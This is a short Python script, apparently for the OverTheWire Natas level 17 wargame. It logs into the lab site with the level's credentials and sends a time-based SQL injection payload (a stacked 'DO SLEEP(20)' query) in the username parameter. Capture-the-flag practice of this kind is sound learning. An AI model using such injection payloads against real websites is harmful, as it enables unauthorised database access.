#!"C:\Users\Tardes\AppData\Local\Programs\Python\Python310\python.exe"

import requests
import re

myusername = 'natas17'
mypassword = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://%s.natas.labs.overthewire.org/index.php' %myusername
myurl = url + '?username=natas18";DO SLEEP(20);SELECT username FROM users WHERE "1=1&debug'

session = requests.Session()
response = session.get(myurl, auth = (myusername,mypassword))
content = response.text

print(content)